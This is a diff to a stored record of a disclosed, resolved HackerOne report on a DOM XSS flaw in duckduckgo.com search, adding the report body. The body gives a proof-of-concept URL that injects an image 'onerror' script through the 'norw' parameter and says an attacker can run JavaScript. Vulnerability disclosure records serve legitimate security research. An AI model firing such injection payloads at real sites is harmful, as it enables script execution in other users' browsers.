@@ -7,6 +7,7 @@ tags:
 substate: "resolved"
 weakness: null
 enriched: true
+body: true
 date: 2020-06-14
 submitted: 2020-05-08T11:43:41.859Z
 bounty_usd: null
@@ -24,6 +25,21 @@ title: "DOM XSS on duckduckgo.com search"
 - Report: [https://hackerone.com/reports/868934](https://hackerone.com/reports/868934)
 - CWE: N/A
 - Submitted: 2020-05-08T11:43:41.859Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Hello, 
+The is a DOM XSS vulnerability on https://duckduckgo.com search through the ```norw``` parameter.
+
+PoC URL:  ```https://duckduckgo.com/?q=a&norw="><img src=/ onerror=alert(document.domain)>```
+
+Screenshot: {F820482}
+
+## Impact
+
+The attacker can execute JS code.
 
 ## Timeline
 
